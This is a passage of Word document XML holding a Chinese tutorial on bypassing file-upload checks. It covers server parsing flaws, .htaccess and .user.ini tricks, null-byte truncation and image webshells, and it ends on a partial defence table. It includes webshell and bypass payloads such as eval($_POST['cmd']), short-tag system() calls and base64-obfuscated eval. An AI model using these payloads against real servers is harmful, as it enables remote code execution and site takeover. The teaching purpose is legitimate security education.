      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="17DA4239" w14:textId="77777777" w:rsidTr="00BF0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BCDF45" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>其他可解析扩展名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3CCE3C00" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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使用同类型但被遗漏的扩展名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4EE08EFC" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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.php3</w:t>
            </w:r>
            <w:r>
              <w:t>、</w:t>
            </w:r>
            <w:r>
              <w:t>.php4</w:t>
            </w:r>
            <w:r>
              <w:t>、</w:t>
            </w:r>
            <w:r>
              <w:t>.phtml</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="6A6BAA95" w14:textId="77777777" w:rsidTr="00BF0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2B5508" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t xml:space="preserve">Apache </w:t>
            </w:r>
            <w:r>
              <w:t>解析漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3869E2F5" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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从右向左遇到不认识的扩展名继续向左解析</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="51349CAE" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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shell.php.abc.xyz</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="3BE559A8" w14:textId="77777777" w:rsidTr="00BF0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7BFB22" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t xml:space="preserve">IIS </w:t>
            </w:r>
            <w:r>
              <w:t>解析漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="125E1B80" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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分号截断特性</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3F51B04D" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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shell.asp;.jpg</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="32480A4B" w14:textId="77777777" w:rsidTr="00BF0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AD5A25" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t xml:space="preserve">Nginx </w:t>
            </w:r>
            <w:r>
              <w:t>解析漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5D682EA8" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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Nginx+PHP</w:t>
            </w:r>
            <w:r>
              <w:t>的</w:t>
            </w:r>
            <w:r>
              <w:t>CGI</w:t>
            </w:r>
            <w:r>
              <w:t>解析特性</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="00D2CE7C" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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/upload/shell.jpg/xxx.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="76D27CAE" w14:textId="77777777" w:rsidTr="00BF0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BFAF46" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>上传</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> .htaccess</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="24B3CF1C" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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修改目录配置让图片文件作为</w:t>
            </w:r>
            <w:r>
              <w:t>PHP</w:t>
            </w:r>
            <w:r>
              <w:t>执行</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="211D299F" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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详见下方说明</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="04062573" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00BF0279"/>
    <w:p w14:paraId="7AD75CCE" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t xml:space="preserve">.htaccess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>绕过详解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3310353C" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:t>如果黑名单没有过滤</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> .htaccess </w:t>
      </w:r>
      <w:r>
        <w:t>文件，可以先上传</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> .htaccess </w:t>
      </w:r>
      <w:r>
        <w:t>文件，内容为：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD715F1" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">AddType </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>application/x-httpd-php .jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49717B8B" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:t>然后再上传一个内容为恶意代码但后缀为</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> .jpg </w:t>
      </w:r>
      <w:r>
        <w:t>的文件，</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Apache </w:t>
      </w:r>
      <w:r>
        <w:t>会将其作为</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> PHP </w:t>
      </w:r>
      <w:r>
        <w:t>脚本解析执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="219D57CB" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:t xml:space="preserve">.htaccess </w:t>
      </w:r>
      <w:r>
        <w:t>是</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Apache </w:t>
      </w:r>
      <w:r>
        <w:t>服务器的目录级配置文件，可实现：</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">URL </w:t>
      </w:r>
      <w:r>
        <w:t>重定向、自定义错误页面、改变文件扩展名、允许</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>阻止用户或目录访问、禁止目录列表、配置默认文档等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3DC77C" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="31"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t xml:space="preserve">.user.ini </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>绕过（针对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t xml:space="preserve"> Nginx + PHP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="591AB77D" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:t>如果使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Nginx + PHP </w:t>
      </w:r>
      <w:r>
        <w:t>且过滤了</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> .htaccess</w:t>
      </w:r>
      <w:r>
        <w:t>，可尝试上传</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> .user.ini </w:t>
      </w:r>
      <w:r>
        <w:t>文件：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70FE0F46" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">.user.ini </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>内容</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9CDA9A" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>auto_prepend_file = shell.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="657B2E9E" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:t>然后上传一个包含</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> PHP </w:t>
      </w:r>
      <w:r>
        <w:t>代码的</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shell.jpg</w:t>
      </w:r>
      <w:r>
        <w:t>，当</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> PHP </w:t>
      </w:r>
      <w:r>
        <w:t>解析其他正常</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> PHP </w:t>
      </w:r>
      <w:r>
        <w:t>文件时，会自动包含</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shell.jpg </w:t>
      </w:r>
      <w:r>
        <w:t>中的代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B85A16" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t xml:space="preserve">⑤ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>后缀名白名单检测</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5864CD0A" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>检测方式：服务端只允许指定的几种后缀名（如仅允许</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> jpg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>png</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>gif</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>），其他一概拒绝。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1AEAAD" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>绕过方法：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0279" w14:paraId="00261176" w14:textId="77777777" w:rsidTr="00BF0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A9B3DB" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>场景</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5E65BD8F" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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绕过方式</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="077F6657" w14:textId="77777777" w:rsidTr="00BF0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788EAB" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>文件名包含路径</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5F0615CE" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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使用</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> 00 </w:t>
            </w:r>
            <w:r>
              <w:t>截断（仅限</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> PHP &lt; </w:t>
            </w:r>
            <w:r>
              <w:t>5.3.4</w:t>
            </w:r>
            <w:r>
              <w:t>）：</w:t>
            </w:r>
            <w:r>
              <w:t>shell.php%00.jpg</w:t>
            </w:r>
            <w:r>
              <w:t>，服务端拼接路径后</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> %00 </w:t>
            </w:r>
            <w:r>
              <w:t>截断字符串，保留</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> .php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="2CB11640" w14:textId="77777777" w:rsidTr="00BF0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85DDAA" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>图片马</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:r>
              <w:t>包含漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5395963A" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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上传图片马（</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">shell.jpg </w:t>
            </w:r>
            <w:r>
              <w:t>内容为</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> PHP </w:t>
            </w:r>
            <w:r>
              <w:t>代码），配合文件包含漏洞（</w:t>
            </w:r>
            <w:r>
              <w:t>LFI/RFI</w:t>
            </w:r>
            <w:r>
              <w:t>）来解析执行</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="13B3343F" w14:textId="77777777" w:rsidTr="00BF0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AF4D4C" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>服务端重命名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0035315C" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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部分</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> CMS </w:t>
            </w:r>
            <w:r>
              <w:t>在上传后会随机重命名文件，需结合其他漏洞（如竞争条件、路径遍历）来利用</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5CE8139A" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t xml:space="preserve">⑥ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>文件内容检测（完整检测）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E44E46D" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>检测方式：服务端读取文件全部内容，检测是否包含恶意代码（如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;?php</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;script </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>等关键词）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43FC01B7" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>绕过方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35DA9456" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:t>使用其他可执行标签（</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">PHP </w:t>
      </w:r>
      <w:r>
        <w:t>短</w:t>
      </w:r>
      <w:r>
        <w:t>标签）：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D796C54" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?=system("id");?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="563D981F" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;? system("id");?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1401D3A7" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;script language="php"&gt;system("id");&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252160D9" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:t>编码混淆：使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> base64_decode</w:t>
      </w:r>
      <w:r>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">gzinflate </w:t>
      </w:r>
      <w:r>
        <w:t>等函数对恶意代码进行编码：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C8D1AA2" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php @eval(base64_decode("ZWNobyAiSGVsbG8iOw=="));?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C437C5D" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:t>利用图片</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> EXIF </w:t>
      </w:r>
      <w:r>
        <w:t>信息：将代码写入图片的</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> EXIF </w:t>
      </w:r>
      <w:r>
        <w:t>注释字段中，配合文件包含利用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6406C883" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>利用数组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拼接绕过关键词检测：将敏感函数拆分为字符串拼接，如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> @eval($_POST['cmd']) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>可改为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> @assert($_POST['cmd']) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>或利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> create_function()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7347236D" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>三、其他进阶绕过技巧</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B2704A3" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>竞争条件上传</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E99463" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:t>利用文件上传后先保存到临时目录、再进行校验和移动的时间差，在文件被删除</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>重命名之前快速访问执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05EE9C7E" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>逻辑漏洞结合</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF6516F" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>修改上传用户</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ID / </w:t>
      </w:r>
      <w:r>
        <w:t>目录路径参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9EE9FC" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>修改返回包中的文件路径信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34836082" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>修改上传次数限制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1A2DA6" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>四、防护建议（供参考理解）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0279" w14:paraId="7DA588DB" w14:textId="77777777" w:rsidTr="00BF0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560BA7" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>防护措施</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7209D10B" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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BF0279" w14:paraId="03980161" w14:textId="77777777" w:rsidTr="00BF0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802F1F" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>白名单优于黑名单</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1A9C91F4" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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只允许特定后缀</w:t>
            </w:r>
            <w:r>
              <w:t>，远比拒绝已知危险后缀可靠</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="0BEE5D57" w14:textId="77777777" w:rsidTr="00BF0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79A181" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>后缀</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> + MIME + </w:t>
            </w:r>
            <w:r>
              <w:t>文件头三重校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
